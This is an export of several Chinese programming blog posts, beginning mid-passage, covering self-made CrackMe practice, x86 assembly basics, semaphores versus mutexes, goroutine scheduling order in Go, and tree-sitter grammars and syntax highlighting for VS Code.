（以后也许还有）的主要用途是学习逆向和汇编的基础知识，巩固记忆，学习和熟悉工具。所以尽可能去除干扰项，只保留想要巩固学习的部分，看起来很傻，基本没啥挑战性。\n有些公共的前置知识（比如寄存器和栈，调用约定，内存模型）我做了个笔记，大概是入不了大佬的眼的。可以在[这里](32位 Windows x86 汇编语言学习 (nnnewb.github.io))看看。\n目前能找到很多 Delphi 和 VB 编写的 CrackMe，Delphi 现在搜搜还能看到些 Delphi still alive 的文章，不过确实比较少见了吧。提到学 GUI 编程，不是推荐 C++/Qt 就是 .Net 全家桶。VB 更是早已完蛋（不是VB.Net），老实说这些 CrackMe 不知道转了几手，还能玩是还能玩，虽然但是吧，总之对我还是略难，看别人的 CrackMe 题解也挺迷茫。\n不过自己会编程就好了嘛！\n","date":"2021-09-10T09:49:00+08:00","permalink":"https://nnnewb.github.io/blog/p/crackme-01/","title":"自娱自乐 CrackMe-1"},{"content":"前言 最近迷上了 Crack Me，入门无果。老是看到有大佬发52pojie又有哪个佬把什么黄油给手撕了，心痒痒。干脆也正正经经地去学一下好了。\n这当然也算是程序员本职的正经知识（心虚而且超大声）。\n常规知识和速记 笔记内容是关于 8086/x86 汇编。\nx86体系结构下内存和寄存器都是小端序。小端序指低位在右，高位在左。如0x1的小端序表示是0000 0001。\n8比特能表示2位16进制数（0xFF，也就是255），16比特能表示4位16进制数（0xFFFF，65535），32比特能表示8位16进制数（0XFFFFFFFF，4294967295）。\n数据类型：\n   助记符 描述     dword 双字（double word），32比特整型数据。   word 字，16比特整型数据。   byte 字节，8比特整型数据。    常用的16进制数记法：\n 0x2A，前缀0x 2AH，后缀H  寄存器 通用寄存器 参考：x86汇编 - 维基百科\n参考：x64体系结构 - windows hardware\n   64位寄存器 32位寄存器 16位寄存器 8位寄存器 用途     RAX或R0 EAX AX AL和AH Accumlator，累加寄存器，用于算术运算。   RBX或R3 EBX BX BL和BH Base，基址寄存器，指向数据块基址（段模式存于段寄存器DS）   RCX或R1 ECX CX CL和CH Counter，用于用于移/环指令及循环（没懂）。   RDX或R2 EDX DX DL和DH Data，用于数学运算和IO操作。   RSI或R6 ESI SI SIL Source Index，指向指令流操作中的源。   RDI或R7 EDI DI DIL Destination Index，指向指令流操作中的目标。   RBP或R5 EBP BP BPL Stack Base Pointer，指向栈的基地址。   RSP或R4 ESP SP SPL Stack Pointer，指向栈顶的地址。   R8 R8D R8W R8B 无别名。   R9 R9D R9W R9B 无别名。   R10 R10D R10W R10B 无别名。   R11 R11D R11W R11B 无别名。   R12 R12D R12W R12B 无别名。   R13 R13D R13W R13B 无别名。   R14 R14D R14W R14B 无别名。   R15 R15D R15W R15B 无别名。    后续还是用 32 位寄存器的名字称呼这些寄存器。\n通用寄存器的用途并不是绝对的，程序可以根据自己的需要将通用寄存器挪作它用。\n其中：\n  16位寄存器本身是32位寄存器的低16位。32位寄存器的高16位没有单独的助记符。\n  16位寄存器又可以单独分成两个8位寄存器使用。其中如AH形式的寄存器表示AX高位8比特，AL则表示低位8比特。\n  EDI 和 ESI 关于EDI和ESI这两个寄存器的用途可以参考 stack overflow 的这篇问答。摘一段例子，下面的C代码：\n1  srcp[srcidx++] = argv[j];   可以被编译成下面的汇编语句：\n1 2 3 4  mov edx,[ebp+0c] mov ecx,[edx+4*ebx] mov [ebp+4*edi-54],ecx inc edi   ebp+0c包含了argv内容，ebx就是j，edi就是srcidx。\n段寄存器 现代操作系统采用内存分页模式，把所有段寄存器指向同址来禁用内存分段模式。然而FS和GS依然用于内存分段模式，用于线程内数据存取。\n   段寄存器助记符 描述     SS Stack Segment，栈段   CS Code Segment，代码段   DS Data Segment，数据段   ES Extra Segment，额外数据段   FS 更额外的数据段   GS 更额外的数据段    x86一共有6个段寄存器，所有段寄存器都是16比特位宽。\n关于段寄存器用途和计算放在主存一节中。\n指令指针 EIP IP 寄存器全称是 Instruction Pointer 寄存器，保存总是保存下一指令的地址。\nx86实模式下使用段内存管理，可寻址1MB内存空间，采用基址（段寄存器）左移4位加上偏移量，相当于20比特位宽地址总线。实模式下EIP可以和CS代码段寄存器结合求取下一指令的具体地址。\n标志寄存器    助记符 描述     CF Carry Flag，进位或借位溢出时记为1，否则0   PF Parity Flag，运算结果最低字节有偶数个1位时记为1，否则0   AF Auxiliary Flag，BCD码算术运算中进位或借位溢出，即运算结果第三位发生进借位时记1，否则0   ZF Zero Flag，运算结果为0时记1，否则0   SF Sign Flag，记运算结果最高位（符号位）   TF Trap Flag，单步调试记1，否则0   IF Interrupt Enable Flag，是否允许响应中断   DF Direction Flag，串方向标记，指示串指令从高地址向低地址还是低地址向高地址处理。   OF Overflow Flag，指示算术运算是否溢出。   IOPL I/O Privilege Level，I/O特权级，2比特宽，CPL小于等于IOPL才允许访问I/O地址空间。   NT Nested Task Flag，当前任务链接上衣任务时置1，否则0。   RF Resume Flag，控制处理器对除障异常的响应。   VM Virtual-8086 Mode Flag，虚拟8086模式标志，置1时进入虚拟8086模式，清0返回保护模式。   AC Alignment Check Flag，该标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。   VIF Virtual interrupt flag，该标志是IF标志的虚拟镜像(Virtual image)，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展(virtual mode extensions)。   VIP Virtual interrupt pending flag，该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零。与VIF标志结合使用。   ID Identification flag，程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。    主存 运行模式和地址模型 x86 CPU 运行模式主要考虑实模式和保护模式，以及特殊的虚拟8086模式。\n实模式有自己的独特地址空间模型，下可视作16位CPU+20比特无保护地址空间，使用段寄存器和通用16位通用寄存器组合寻址，算法base\u0026lt;\u0026lt;4+offset。最大可寻址1MB。\n虚拟8086模式用于在保护模式下运行实模式程序，并不是真正的CPU模式，CPU实际还是运行在保护模式。一些程序利用虚拟8086模式可以实现在保护模式下运行实模式程序，如 dosbox、dosemu 。\n保护模式下可以用逻辑地址访问主存，逻辑地址又称远指针（far ptr），逻辑地址由段选择器加上偏移寻址组成。运行于 IA-32 体系的程序，段选择器最多可以选择 2^14^-1 个段，每个段可以长达 2^32^ 字节。\nnear/far/huge 指针 near 指针是给定段内用16比特表示的偏移值，最大访问地址空间64KB。\nfar 指针是32比特表示的偏移值，在16位架构下可以访问段外的内存，32/64位架构下则依然是段内。\nhuge指针和far指针大小相同，大体目标就是在16位限制下访问更大的地址空间。\n平坦内存模型/线性内存模型 参考：flat memory model - wiki\n平坦内存模型也叫线性内存模型，定义是程序中的内存在同一个连续的地址空间中，不需要通过分段或分页机制间接取址。（从操作系统或硬件角度来说，可能依然有分页或分段，但对用户程序来说无感知）。\nIntel 内存模型 下述内存模型是实模式下的，保护模式下更近似于线性模型。\n   模型 数据段指针 代码段指针 定义     Tiny near near CS=DS=SS   Small near near DS=SS   Medium near far DS=SS，多个代码段   Compact far near 一个代码段，多个数据段   Large far far 多个代码段和数据段   Huge huge far 多个代码段和数据段，单个数组可能超过64KB     在Tiny模型下，所有段寄存器指针指向相同的段。 在所有DS=SS的模型里，数据段指针总是near。 栈总是限制在最高64KB。  函数 栈 参考：栈的增长方向？ - 知乎\n讨论对象是 Windows x86 32位程序。栈从高位向低位增长，需要注意看栈视图的地址是高地址在上还是低地址在上，被调用方的栈帧总是在调用方的增长方向上。\n例如下面的汇编指令。\n1 2 3 4 5  push eax ; 把eax当参数入栈 esp=75f888 push eax ; 把eax当参数入栈 esp=75f884 push eax ; 把eax当参数入栈 esp=75f880 call example.fn ; 调用 add esp,0xc ; 调用方清栈，cdecl调用约定   执行call指令，跳转到被调用函数时，栈上会压入函数的返回地址。\n栈指针 frame pointer 栈指针可以通过编译参数 -fomit-frame-pointer 或 /Oy- 来关闭。\n在有栈指针（frame pointer）的情况下，每个函数开头会做一个\n1 2  push ebp mov ebp,esp   的动作，这个动作做完后，新栈帧的栈底就是 ebp 了，ebp正好指向旧栈帧基地址，在ebp下（和栈增长方向相反）就是函数返回地址和调用方给的实参。\n在函数返回前，又会做一个\n1  pop ebp   来完成平栈。\n下面就是被调函数执行完函数开头的指令后的栈。\n   地址（栈向下增长） 内容含义     [ebp+0x10] 第3个参数   [ebp+0xc] 第2个参数   [ebp+0x8] 第1个参数   [ebp+0x4] 函数的返回地址   [ebp] 上一个栈帧基地址，此时esp和ebp相同。    关闭栈指针的情况下，函数不会在开头保存ebp了，对函数参数的引用也会改为相对esp的偏移。\n调用约定 先讨论 cdecl 调用约定，函数调用的一般过程是：\n1 2 3 4  push 0x0 ; 压栈参数 0 push example.50be50 ; 压栈参数 \u0026#34;%d\u0026#34; call example._printf ; 调用 printf(\u0026#34;%d\u0026#34;, 0) add esp,0x8 ; cdecl 约定下，调用者清栈   stdcall调用约定和cdecl调用约定的区别在于stdcall是被调用方清栈：\n1  ret 0x8 ; ret 有一个的可选参数，指示要从栈上弹出多少空间。相当于是先 add esp,0x8 再 ret   cdecl是大部分编译器包括微软VC++默认的调用约定，stdcall是所有 Windows API 的调用约定。\nname mangling 好像没有广泛使用的译名，可以叫名字修饰、名字重整或改编，意会吧。\n对于有使用c/c++编程经验的人可能已经见过很多链接错误：\n undefined reference to \u0026hellip; 无法解析的外部符号 \u0026hellip;  如果注意过提示中的符号名应该会发现这些符号名称都不是代码里写的函数名称，而是经过了变形的。\ncdecl调用约定下，name mangling 的规则是在符号前加下划线。比如C库的printf函数，经过name mangling后是_printf。\nstdcall调用约定下，name mangling 的规则是在符号前加下划线，符号后加 @参数长度。需要注意的是对于C中的变长参数 variadic function，是不能用 stdcall 调用约定的。\n用函数 int fn(int a, int b) 举例，认为 int 是 4 字节长，此时cdecl下叫_fn，stdcall下叫_fn@8。\n","date":"2021-09-09T16:14:00+08:00","permalink":"https://nnnewb.github.io/blog/p/assembly-learning-note/","title":"32位 Windows x86 汇编语言学习"},{"content":"看 go-patterns/semaphore.md at master · tmrts/go-patterns (github.com) 时产生了疑问，信号量为啥长得和互斥锁没啥区别呢。于是就谷歌了一圈，重温下一些关于并发的知识，对比信号量 semaphore 和互斥锁 mutex 。\n互斥锁 mutex 以 pthread 自带的互斥锁为例，提供了三种不同类型的互斥锁：\n PTHREAD_MUTEX_NORMAL ，普通的互斥锁，不支持死锁检测（does not detect deadlock），不支持递归加锁（relock without first unlocking it 会导致死锁），不检测解锁线程，解锁一个未加锁的互斥锁是未定义行为（undefined behavior）。 PTHREAD_MUTEX_ERRORCHECK，带错误检查的互斥锁，不支持递归加锁（会返回错误），解锁其他线程的互斥锁会返回错误，解锁未加锁的互斥锁会返回错误。 PTHREAD_MUTEX_RECURSIVE，递归加锁（relock with out unlocking it）会成功，解锁时需要调用解锁的次数和加锁时调用加锁的次数相同。解锁其他线程的互斥锁会返回错误。解锁未加锁的互斥锁会返回错误。 PTHREAD_MUTEX_DEFAULT，默认互斥锁类型，对这一类型的互斥锁递归加锁时行为是未定义的，解锁未加锁的互斥锁行为是未定义的，解锁其他线程的互斥锁行为是未定义的。这一类型的互斥锁通常映射为另外几种互斥锁之一。  可以比较清楚地看出，互斥锁有三个基本特征：\n 是否可重复加锁 是否可解锁未加锁的互斥锁 是否可解锁被其他人加锁的互斥锁  最严格的 PTHREAD_MUTEX_ERRORCHECK 类型互斥锁，对此定义是 NO、NO、NO 。\n互斥锁的基本使用方式和使用场景有点像厕所的坑位：\n 抢坑位，锁门 你懂的 解锁，出门  其中有隐含的信息包括：\n 坑位是提前选择好的，你只能抢一个坑位，不能抢多个坑位。 坑位在使用期间是独占的，你不能和别人分享一个坑位。 只有你自己能解锁坑位，谁也不想办事儿的时候有人闯进来吧？  而递归加锁这一特殊场景，我寻思吧，有点难拿坑位比喻。反正也不重要，就别管了。\n信号量 semaphore 信号量本质上是一个整型值，不细分什么类型了。还是用 pthread 举例吧，依据 POSIX 标准。\n对信号量的操作可以先简单分5种。\n sem_init(sem,pshared,value)，初始化一个信号量，可以指定要不要在 fork() 创建的进程间共享，还可以指定信号量初始值。 sem_wait(sem)，等待信号量，信号量等于0时阻塞，其他线程通过sem_post唤醒。 sem_post(sem)，发送信号量，唤醒阻塞在sem_wait的线程。 sem_getvalue(sem,valp)，获取信号量当前值。 sem_destroy(sem)，销毁信号量。  信号量的主要特征就是它的值：\n 当值等于0时，sem_wait 会阻塞。 当值大于0时，sem_wait 返回并使值-1。  可以注意到，信号量的确可以做到互斥锁能做到的事情：设定好初始值1，然后sem_wait等同于加锁，sem_post等同于解锁，的确模拟出了互斥锁的功能。\n不过信号量去模拟互斥锁会有一些问题。比如说无法实现递归加锁（信号量值等于0时，sem_wait会阻塞），无法检测解锁线程是不是加锁线程（除非你自己再封装一次，把信号量和线程ID绑定），解锁未加锁会导致信号量值大于1，进而造成sem_wait会允许多个线程并行执行（还是一样，你得自己封装，在sem_post前检查当前信号量的值）。\n好，模拟互斥锁的话题到此为止。回到屎尿屁的比喻上。互斥锁可以比作公厕收费的老大爷。\n 老规矩，不排队，大家从老大爷手里抢坑位。 坑位满员的时候老大爷谁也不让进。 每出来一个人，老大爷就放进去一个人。  其中隐含的信息包括：\n 当然，可用的坑位或者说资源依然是有限的，数量不确定。 你只能独占一部分资源，而且每个人独占的资源都一样多。不然老大爷看到有一个坑位放你进去了，但你想要用两个坑位，那你就只能继续等着，或者和别人分享坑位了。  信号量最好用的场景还是 生产者-消费者 模型的队列，来统计队列中元素数量。消费者可以用一个简单的 sem_timedwait 调用实现等待新元素加入队列，用互斥锁来确保队列操作是线程安全的。\n可见管公厕的老大爷也是非常有生活智慧哈，充分利用了年轻时的编程经验来提高晚年生活质量。\n结论 互斥锁和信号量都能处理数据竞争，但各有侧重。\n典型的数据竞争场景当然是互斥锁好用，但信号量也不是完全不行。\n信号量的典型场景也一样，互斥锁即便能行也会显得别扭。\n","date":"2021-08-26T00:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E4%BF%A1%E5%8F%B7%E9%87%8F-vs-%E4%BA%92%E6%96%A5%E9%94%81/","title":"信号量 vs 互斥锁"},{"content":"不是我做的沙雕面试题，在 segmentfault 上看到的。\n原题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;runtime\u0026#34; \u0026#34;sync\u0026#34; ) func main() { runtime.GOMAXPROCS(1) wg := sync.WaitGroup{} wg.Add(10) for i := 0; i \u0026lt; 5; i++ { go func() { fmt.Println(\u0026#34;A:\u0026#34;, i) wg.Done() }() } for i := 0; i \u0026lt; 5; i++ { go func(num int) { fmt.Println(\u0026#34;B:\u0026#34;, num) wg.Done() }(i) } wg.Wait() }   问：代码输出结果是什么？\n胡乱分析 第一眼进去看到 runtime.GOMAXPROCS(1) ，初步怀疑是又在考什么 GMP 面试题了。\n但凡说到 Go 面试好像就一定要考一下 goroutine 调度和 GMP 模型，招进来又只让你写 curd 。搞得面试跟考试背书一样。\n先不吐槽，继续看。跳过两行 sync.WaitGroup 之后就是一个经典 for 循环陷阱。\n1 2 3 4 5 6  for i := 0; i \u0026lt; 5; i++ { go func() { fmt.Println(\u0026#34;A:\u0026#34;, i) wg.Done() }() }   就是个典型的闭包捕获问题，i 被以引用形式捕获进匿名函数，循环中的 i++ 会导致所有匿名函数捕获的 i 的值都跟着变。\n但有所区别的是，这个匿名函数被当 goroutine 执行了。之后再细说。\n1 2 3 4 5 6  for i := 0; i \u0026lt; 5; i++ { go func(num int) { fmt.Println(\u0026#34;B:\u0026#34;, num) wg.Done() }(i) }   这就是上面错误例子的正确写法，把闭包捕获变成了参数传递，将 i 复制了一份进匿名函数。\n好了，那么根据上面的分析，最终结果是\u0026hellip;？\n1 2 3 4 5 6 7 8 9 10  A: 5 A: 5 A: 5 A: 5 A: 5 B: 0 B: 1 B: 2 B: 3 B: 4   是这样吗？\n再次胡乱分析 遗憾的是实际跑起来结果是\n1 2 3 4 5 6 7 8 9 10  B: 4 A: 5 A: 5 A: 5 A: 5 A: 5 B: 0 B: 1 B: 2 B: 3   可以看到最后一个启动的 goroutine 的输出跑到了最开头。其他顺序倒是没啥变化。为啥呢？\n先看 runtime.GOMAXPROCS(1) 。\n从 GMP 模型可以得知这一句代码实际限制了所有 goroutine 只能被顺序串行执行（所有 g 都只能在这唯一一个 p 的本地队列里等待 m）。\n而 main() 函数里创建 goroutine 的顺序是明确的，5 个 A，5 个 B。\n按照一般理解的话，队列是先进先出 FIFO 的结构，一个 p 又限制了其他 m 即使唤醒了，抢占了 p，也不能做 work stealing（也用不着做），那么 goroutine 的执行顺序自然只能是先进先出了。\n那么这个程序的行为就很奇怪了，先创建的 goroutine 先执行的话，那么输出顺序应该和我们预料的一样。实际运行结果为什么会变成这样呢？\n不卖关子了 直接说结论嗷。\n不知道。\n别笑，真的不知道。特地上爆栈搜了下，得到的结论就是，不知道。\n In Go 1.5, the order in which goroutines are scheduled has been changed. The properties of the scheduler were never defined by the language, but programs that depend on the scheduling order may be broken by this change. We have seen a few (erroneous) programs affected by this change. If you have programs that implicitly depend on the scheduling order, you will need to update them.\n 从一个 Go 语言使用者的角度来说，goroutine 调度器的实现细节（像是多个 goroutine 之间的运行顺序）并不是能依赖的东西。\n如果写过一段时间的 C/C++ ，那么面试官应该很清楚，C/C++ 有几样臭名昭著的东西： Undefined Behavior, Unspecified Behavior。而 goroutine 执行顺序就是一个 Go 中的 Undefined Behavior。\n结论 我理解中的拿来主义，既不能被动地等待，也不能不加分辨地拿来，而既然加以分辨了，自然更不应该将拿来的事物当成解决一切问题的万能药。\nGo 虽然是一门不错的语言，试图将语言细节尽可能明确定义来避免再次陷入 C/C++的陷阱，但显然 Go 用户不这么想。至少，有部分 Go 用户不这么想，他们想搞清楚 Go 的一切，然后把这一切都当作至高无上的准则，来鞭挞其余人。\n目前为止，GMP 很好，作为面试题也说得过去。\n到底我只是厌恶这世上的一部分人罢了。\n","date":"2021-08-04T10:37:24+08:00","permalink":"https://nnnewb.github.io/blog/p/%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B-goroutine-%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/","title":"面试题之 goroutine 运行顺序"},{"content":"这次用 tree-sitter 写一个简单的代码高亮。\n前言 我寻思代码高亮是什么应该没啥可解释的，也有叫“语法高亮”，总之都是一个意思。就是给编辑器里的代码涂上颜色，便于阅读。\n一般来说，简单的代码高亮只需要正则表达式就能搞定（比如说关键字高亮，Camel Case 标识符高亮等），不过正则表达式来实现高亮还是有很大的局限性。\n举例来说，当我把函数当参数传给另一个函数的时候——\n1 2 3 4 5 6 7  function f() {} function higher(fn) { return () =\u0026gt; fn() != 0; } higher(f);   在 higher(f) 这一行中的 f 不会以函数名的颜色标出。这就引出了一种新基于语义的代码高亮，让编辑器真正“认识”你的代码，并提供更聪明的提示。\n开始 还是在 vscode 折腾。\n先创建一个 vscode 插件项目，用 yo code 完成。\n然后编辑 package.json ，添加你的语言和插件的激活事件。\n1 2 3 4 5 6 7 8 9 10 11  { \u0026#34;activationEvents\u0026#34;: [\u0026#34;onLanguage:proto\u0026#34;], \u0026#34;contributes\u0026#34;: { \u0026#34;languages\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;proto\u0026#34;, \u0026#34;extensions\u0026#34;: [\u0026#34;.proto\u0026#34;] } ] } }   然后修改 src/extension.ts，去掉默认创建的 hello world 代码，留一个 console.log，然后 F5 启动，打开一个 .proto 文件，检查插件是否已经激活。\n1 2 3 4 5 6 7 8 9 10 11 12  // The module \u0026#39;vscode\u0026#39; contains the VS Code extensibility API // Import the module and reference it with the alias vscode in your code below import * as vscode from \u0026#34;vscode\u0026#34;; // this method is called when your extension is activated // your extension is activated the very first time the command is executed export function activate(context: vscode.ExtensionContext) { console.log(\u0026#34;activated!\u0026#34;); } // this method is called when your extension is deactivated export function deactivate() {}   创建和注册 DocumentSemanticTokensProvider 创建文件 src/providers/SemanticTokensProvider.ts ，编写一个类，实现接口 vscode.DocumentSemanticTokensProvider。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import * as vscode from \u0026#34;vscode\u0026#34;; const Parser = require(\u0026#34;web-tree-sitter\u0026#34;); export default class SemanticTokenProvider implements vscode.DocumentSemanticTokensProvider { constructor(public legend: vscode.SemanticTokensLegend) { Parser.init().then(() =\u0026gt; { Parser.Language.load( path.resolve(__dirname, \u0026#34;../../assets/tree-sitter-proto.wasm\u0026#34;) ).then((lang) =\u0026gt; { this.parser = new Parser(); this.parser.setLanguage(lang); }); }); } onDidChangeSemanticTokens?: vscode.Event\u0026lt;void\u0026gt; | undefined; provideDocumentSemanticTokens( document: vscode.TextDocument, token: vscode.CancellationToken ): vscode.ProviderResult\u0026lt;vscode.SemanticTokens\u0026gt; { throw new Error(\u0026#34;Not implemented\u0026#34;); } }   再到 src/extension.ts 里注册。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  export function activate(context: vscode.ExtensionContext) { console.log(\u0026#34;activated!\u0026#34;); // register semantic tokens provider  const tokenTypes = [ \u0026#34;type\u0026#34;, \u0026#34;enum\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;function\u0026#34;, \u0026#34;comment\u0026#34;, \u0026#34;string\u0026#34;, \u0026#34;number\u0026#34;, \u0026#34;keyword\u0026#34;, \u0026#34;parameter\u0026#34;, ]; const modifiers = [\u0026#34;definition\u0026#34;, \u0026#34;deprecated\u0026#34;, \u0026#34;documentation\u0026#34;]; const selector: vscode.DocumentSelector = { language: \u0026#34;proto\u0026#34;, scheme: \u0026#34;file\u0026#34;, }; const legend = new vscode.SemanticTokensLegend(tokenTypes, modifiers); const provider = new SemanticTokenProvider(legend); context.subscriptions.push( vscode.languages.registerDocumentSemanticTokensProvider( selector, provider, legend ) ); }   这个 tree-sitter-proto.wasm 是编译好的语法定义，参考另一篇文章。\n这样一来，new SemanticTokenProvider(legend) 时就会初始化 parser 了。\n实现 先写个简单的 provideDocumentSemanticTokens 实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class SemanticTokenProvider { provideDocumentSemanticTokens( document: vscode.TextDocument, token: vscode.CancellationToken ): vscode.ProviderResult\u0026lt;vscode.SemanticTokens\u0026gt; { const tree = this.parser?.parse(document.getText()); const query: Parser.Query = this.parser ?.getLanguage() .query(\u0026#39;(\u0026#34;message\u0026#34;) @keyword\u0026#39;); const captures = query.captures(tree!.rootNode); const tokenBuilder = new vscode.SemanticTokensBuilder(this.legend); for (const capture of captures) { tokenBuilder.push( new vscode.Range( new vscode.Position( capture.node.startPosition.row, capture.node.startPosition.column ), new vscode.Position( capture.node.endPosition.row, capture.node.endPosition.column ) ), capture.name ); } const tokens = tokenBuilder.build(); return Promise.resolve(tokens); } }   最核心的部分就是 getLanguage().query() 了，这里用了 tree-sitter 的查询语言 DSL 实现快速从语法树里提取对应的节点。\n放个查询语言的文档，再简要介绍下。\n A query consists of one or more patterns, where each pattern is an S-expression that matches a certain set of nodes in a syntax tree.\n 本质上查询语言是个模式匹配工具，以 s-expression 作为模式语言。例如下面的查询。\n1  (number)   就是查询 ast 里所有的 number 节点。而 number 节点的定义在 tree-sitter 项目语法定义 grammar.js 中给出。\n再看复杂一点的查询：\n1 2 3 4  (binary_expression (number) (number) )   就是查询语法树中的 包含两个 number 子节点的 binary_expression 节点，不限定 number 节点的位置，只要是子节点就行。\n语法树的结构可以参考 tree-sitter parse 命令的输出。\n当然也可以以子节点的值为条件来查询。\n1 2 3  (binary_expression left:(number) )   再看如何捕获查询结果。\n1 2 3  (function name: (identifier) @function_name )   用 @ 开头的标识符指定捕获的名称，通过 query.captures() 即可完成捕获，返回 {name: string, node: Node} 这样子的对象的列表。\n这样一来，上面的代码就很容易理解了。\n1 2 3 4  const query: Parser.Query = this.parser ?.getLanguage() .query(\u0026#39;(\u0026#34;message\u0026#34;) @keyword\u0026#39;); const captures = query.captures(tree!.rootNode);   这两句话查询出了语法树里所有的 message 关键字\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  const tokenBuilder = new vscode.SemanticTokensBuilder(this.legend); for (const capture of captures) { tokenBuilder.push( new vscode.Range( new vscode.Position( capture.node.startPosition.row, capture.node.startPosition.column ), new vscode.Position( capture.node.endPosition.row, capture.node.endPosition.column ) ), capture.name ); }   这一段循环将捕获的结果构造出高亮 token，注意这里用了 capture.name 作为标识符的类型，也就是上面的 query 里指定的 keyword 。\n最终，将分词的结果返回出去。\n1 2  const tokens = tokenBuilder.build(); return Promise.resolve(tokens);   F5 运行即可看到源码中所有 message 都被标上了关键字的颜色。\n","date":"2021-08-03T15:52:21+08:00","permalink":"https://nnnewb.github.io/blog/p/%E7%94%A8-tree-sitter-%E5%86%99%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE/","title":"用 tree-sitter 写一个代码高亮"},{"content":"什么是tree-sitter呢？\ntree-sitter 是一个 parser-generator，也是一个增量解析库（incremental parsing library）。它可以为源文件构建完整的语法树，并在源文件被编辑时高效地更新。\n快速开始 tree-sitter 本身是一个 parser generator ，使用 javascript 来作为描述语法规则的语言（不像其他，如 yacc 一类的工具，以类似 EBNF 的 DSL 来描述语法规则）。\n我们写 tree-sitter 语法规则本质上是类似于写一个 tree-sitter 的语法支持包，可以参考下 tree-sitter/tree-sitter-go: Go grammar for tree-sitter (github.com) 的项目结构。\n废话不多说，先写个简单的 demo 跑起来。\n1 2 3 4  mkdir tree-sitter-hello \u0026amp;\u0026amp; cd tree-sitter-hello npm init npm i --save nan npm i --save-dev tree-sitter-cli   初始化好项目目录，在 package.json 里写个简单的命令，方便之后用。\n1 2 3 4 5  { \u0026#34;scripts\u0026#34;:{ \u0026#34;test\u0026#34;: \u0026#34;tree-sitter generate \u0026amp;\u0026amp; tree-sitter parse test.txt\u0026#34; } }   现在开始干正事儿，创建一个 grammar.js\n1 2 3 4 5 6 7  module.exports = grammar({ name: \u0026#39;hello\u0026#39;, rules: { source_file: $ =\u0026gt; repeat($.word), // 非终结符，0或更多的 word  word: $ =\u0026gt; /\\w+/ // 非常简单的终结符，表示一个词，可以是数字字母下划线组成 } })   再写一个 test.txt 作为输入\n1  amazing tree sitter   最后运行。\n1  npm run test   输出结果\n1 2 3 4 5 6 7 8  \u0026gt; tree-sitter-hello@0.1.0 test \u0026gt; tree-sitter generate \u0026amp;\u0026amp; tree-sitter parse test.txt (source_file [0, 0] - [1, 0] (word [0, 0] - [0, 7]) (word [0, 8] - [0, 12]) (word [0, 13] - [0, 19]))   就是这样！\n规则 DSL 所有规则都用这种格式编写\n1 2  rule_name1: $ =\u0026gt; /terminal-symbol/, rule_name2: $ =\u0026gt; seq(\u0026#39;non\u0026#39;, \u0026#39;terminal\u0026#39;, \u0026#39;symbol\u0026#39;)   正则表达式或字符串表示终结符，规则函数表示非终结符（token函数是例外）\n一些函数来标识 ENBF 里出现的规则：\n repeat 就是重复0或多次，类似 EBNF 的 { } 含义 repeat1 至少出现一次，可以重复多次，类似 EBNF 的  SYM { SYM } 这样的形式 optional 可选，类似 EBNF 的 [ ] 含义 choice 多选一，类似 EBNF 的 | 含义 seq 序列，表示前后顺序，在 EBNF 里就是符号出现的顺序 token ，把一个复杂规则合并成一个 token，一般是难以用一个正则表达式解决的终结符会用 token(choice(/hex/,/octal/,/decimals/)) 这种形式编写。  还有其他的，用于设置左右联结性优先级什么的，就不多介绍了。可以自己看tree-sitter的文档。\n更复杂一点的例子 贴一个参考 protocol buffer 3 的 spec 写出来的 grammar.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178  module.exports = grammar({ name: \u0026#39;protobuf\u0026#39;, extras: ($) =\u0026gt; [$.comment, /\\s/], rules: { // top  source_file: ($) =\u0026gt; seq($.syntax, repeat(choice($.import, $.package, $.option, $.emptyStatement, $.enum, $.message, $.service))), // comment  comment: ($) =\u0026gt; token(seq(\u0026#39;//\u0026#39;, /.*/)), // syntax  syntax: ($) =\u0026gt; seq(\u0026#39;syntax\u0026#39;, \u0026#39;=\u0026#39;, /\u0026#34;proto3\u0026#34;/, \u0026#39;;\u0026#39;), // package  package: ($) =\u0026gt; seq(\u0026#39;package\u0026#39;, $.fullIdent, \u0026#39;;\u0026#39;), // imports  import: ($) =\u0026gt; seq(\u0026#39;import\u0026#39;, $.strLit, \u0026#39;;\u0026#39;), // option  option: ($) =\u0026gt; seq(\u0026#39;option\u0026#39;, $.optionName, \u0026#39;=\u0026#39;, $.constant, \u0026#39;;\u0026#39;), optionName: ($) =\u0026gt; choice(seq(\u0026#39;(\u0026#39;, $.fullIdent, \u0026#39;)\u0026#39;), $.fullIdent), // enum  enum: ($) =\u0026gt; seq(\u0026#39;enum\u0026#39;, $.enumName, $.enumBody), enumBody: ($) =\u0026gt; seq(\u0026#39;{\u0026#39;, repeat(choice($.option, $.enumField, $.emptyStatement)), 